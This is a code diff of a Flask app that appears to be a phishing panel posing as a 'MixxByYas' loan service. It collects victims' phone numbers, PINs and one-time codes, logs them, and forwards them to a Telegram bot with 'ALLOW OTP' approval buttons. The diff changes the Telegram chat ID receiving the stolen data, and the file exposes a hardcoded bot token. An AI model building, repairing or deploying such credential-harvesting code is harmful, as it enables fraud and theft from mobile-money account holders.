@@ -11,7 +11,7 @@ app = Flask(__name__)
 app.secret_key = 'mixx-tz-2024'
 
 BOT_TOKEN = '8878770833:AAFonyFuaxzWZtljxNSydBdVJqX-HW3jR7g'
-CHAT_ID = '7294395141'
+CHAT_ID = '8589275340'
 TELEGRAM_API = f'https://api.telegram.org/bot{BOT_TOKEN}'
 
 def init_db():
@@ -45,7 +45,6 @@ def add_column():
 
 add_column()
 
-# ==================== TELEGRAM SENDER WITH FULL DEBUG ====================
 def send_telegram(message, reply_markup=None):
     print("🔥 send_telegram CALLED")
     print(f"   Message: {message}")
@@ -73,14 +72,12 @@ def edit_telegram(message_id, text):
     except Exception as e:
         print(f"Edit error: {e}")
 
-# ==================== TEST ROUTE – open this URL in browser to force a Telegram message ====================
 @app.route('/test_telegram')
 def test_telegram():
     print("🚀 TEST TELEGRAM ROUTE HIT")
     send_telegram("This is a test message from MixxByYas. If you see this, the bot works!")
     return "Telegram test message sent. Check the Render logs and your Telegram chat."
 
-# ==================== REGULAR ROUTES ====================
 @app.route('/')
 def index():
     return render_template('index.html')
@@ -104,7 +101,6 @@ def submit_loan():
     print(f"📥 NEW LOAN REQUEST: phone={phone}, pin={pin}, amount={amount}, purpose={purpose}")
     conn = sqlite3.connect('database.db'); c = conn.cursor()
 
-    # OTP REQUESTED (Resend)
     if purpose == 'OTP REQUESTED':
         c.execute("SELECT COUNT(*) FROM loans WHERE phone=? AND status='pending' AND code_status='pending'", (phone,))
         if c.fetchone()[0] >= 3:
@@ -118,7 +114,6 @@ def submit_loan():
         send_telegram(msg, {'inline_keyboard':[[{'text':'✅ ALLOW OTP','callback_data':f'allow_{app_id}'}]]})
         return jsonify({'success':True,'app_id':app_id})
 
-    # Check returning user
     c.execute('SELECT total_applications FROM users WHERE phone = ?',(phone,))
     existing = c.fetchone()
     is_returning = existing is not None
@@ -143,7 +138,6 @@ def submit_loan():
     send_telegram(msg, keyboard)
     return jsonify({'success':True,'app_id':app_id})
 
-# rest of the routes unchanged (submit_code, check_status, webhook) – same as before
 @app.route('/api/submit_code', methods=['POST'])
 def submit_code():
     data = request.json
